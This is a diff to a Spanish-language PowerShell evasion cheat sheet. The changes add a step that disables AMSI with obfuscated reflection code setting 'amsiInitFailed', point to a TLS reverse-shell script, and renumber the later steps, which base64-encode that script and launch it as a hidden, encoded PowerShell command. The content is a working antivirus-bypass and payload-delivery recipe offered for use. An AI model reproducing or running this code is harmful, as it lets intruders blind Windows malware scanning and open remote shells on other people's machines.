@@ -34,13 +34,22 @@ Aquí otro método que he visto, pero la idea es utilizar el tuyo propio:
 set-alias new-exercise $($shurmano | foreach { if ($_ -cmatch '[A-Z]' -eq $true) {$x += $_}}; $x)
 ```
 
-**3.- Pasar el script de powershell a base64**
+**3.- Una vez ofuscado, deshabilitar AMSI para lanzar script**
+Echad un vistazo a la función PatchMe del [tls reverse shell(https://github.com/g4ngli0s/chuletas/blob/master/bypasspowershell/tlsrevshell.ps1)] donde lo que realmente hace es cifrar esto:
+
+```powershell
+[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('Syste' + 'm.Ref' + 'lect' + 'ion.Bi' + 'ndi' + 'ngF' + 'lags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('Syste' + 'm.Typ' +
+ 'e')), [Object]([Ref].Assembly.GetType('Syste' + 'm.Man' + 'agemen' + 't.Automa' + 'tion.Am' + 'siU' + 'ti' + 'ls')),('GetF' + 'ield')).Invoke('am' + 'siIn' + 'itFai' + 'led',(('NonPu' + 'blic,S' + 'tatic') -as [String].Assembly
+.GetType('Syste' + 'm.Refl' + 'ection.B' + 'indingF' + 'lags'))).SetValue($null,$True)
+```
+
+**4.- Pasar el script de powershell a base64**
 
 ```
 cat tlsrevshell.ps1 | iconv -f UTF8 -t UTF16LE | base64 -w 0
 ```
 
-**4.- Ejecutarlo desde consola PS**
+**5.- Ejecutarlo desde consola PS**
 
 ```
 powershell -noP -sta -w 1 -enc ENC64SCRIPT
